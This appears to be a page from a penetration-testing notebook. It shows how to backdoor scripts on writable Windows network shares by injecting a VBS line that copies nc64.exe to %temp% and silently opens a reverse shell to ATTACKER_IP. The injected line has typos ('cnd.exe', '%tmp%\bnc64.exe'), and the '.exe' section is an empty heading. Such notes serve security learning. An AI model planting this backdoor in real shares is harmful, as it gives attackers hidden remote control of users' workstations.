# Abusing writable shares

## Resources

1. `CreateObject` function

{% embed url="https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/createobject-function" %}

2. `Run` method

{% embed url="https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp" %}

{% embed url="https://ss64.com/vb/run.html" %}

3. `copy`&#x20;

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/copy" %}

## Backdoor mechanism

It is quite common to find network shares that hosts executable or scripts created by the administrator, that users can use to perform daily tasks. This is useful  for users since they can execute the shared resource without copying or installing it.&#x20;

Whenever a user opens the shortcut on their workstation, the executable or script will be copied from the server to the local `%temp%` folder, where it will be executed. Thus, any payload will run in the context of the final user's workstation and logged-in user account.

If the share is writable by anyone (or at least our compromised account), we can abuse this to create a backdoor.

### (1) Backdoor via `.vbs` scripts

Given that we have found a VBS (`.vbs` ) script running hosted on the share, we can inject a malicious code into script to provide ourselves with a backdoor.

First, we have to upload a binary (such as `nc64.exe` ) that will aid us in creating the backdoor. This can be achieved using [smbclient](https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient).

Next, we can inject the malicious in the existing script. Assuming that the writable share is at `\\TARGET_IP\writable_share` .

{% code overflow="wrap" %}
```visual-basic
CreateObject("WScript.Shell").Run "cmd.exe /c copy /y \\TARGET_IP\writable_share\nc64.exe %temp% & %tmp%\bnc64.exe -e cnd.exe ATTACKER_IP PORT", 0, True
```
{% endcode %}

Essentially, this command executes a command from  `cmd.exe` , which calls `copy` to copy the uploaded `nc64.exe` binary on the share to the `%temp%` directory, before executing the reverse shell that provides us a backdoor to the system.

* the `/y` flag to `copy` means

> Suppresses prompting to confirm that you want to overwrite an existing destination file.

&#x20;According to this [page](https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp), the following describes the last 2 values provided to the `Run` method:

* `intWindowStyle`

> Optional. Integer value indicating the appearance of the program's window. Note that not all programs make use of this information.

value of `0` : "Hides the window and activates another window."

* `bWaitOnReturn`

> Optional. Boolean value indicating whether the script should wait for the program to finish executing before continuing to the next statement in your script.&#x20;

If set to `True` , script execution halts until the program finishes.



Now, whenever someone executes this script, we will gain a remote shell on that user's desktop.

### (2) Backdoor via `.exe` files





